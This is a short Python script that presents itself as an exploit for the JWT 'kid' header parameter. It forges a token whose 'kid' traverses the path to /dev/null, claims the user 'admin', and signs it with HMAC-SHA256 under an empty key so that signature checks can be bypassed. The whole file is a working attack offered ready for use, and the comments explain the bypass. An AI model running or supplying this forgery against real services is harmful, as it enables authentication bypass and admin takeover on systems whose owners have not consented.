#!/usr/bin/env python2.7

#Exploitation script for JWT Kid header parameter.
#Often used to retrieve a key from:
#- the filesystem
#- a database

#--> This is done prior to the verification of the signature.
#--> If the parameter is injectable you can bypass the signature.

import base64
import hmac
import hashlib

header = '{"typ":"JWT","alg":"HS256","kid":"../../../../../../../dev/null"}'
payload = '{"user":"admin"}'
key = b""

modifheaderb64 = ((base64.b64encode(header.encode('ascii'))).decode('utf-8')).rstrip("=")
payloadb64 = ((base64.b64encode(payload.encode('ascii'))).decode('utf-8')).rstrip("=")
        
headPay = modifheaderb64+"."+payloadb64

signature = base64.b64encode(hmac.new(key,headPay,hashlib.sha256).digest()).decode('utf-8').rstrip("=")

jwt = modifheaderb64 + '.' + payloadb64 + '.' + signature

print (jwt)
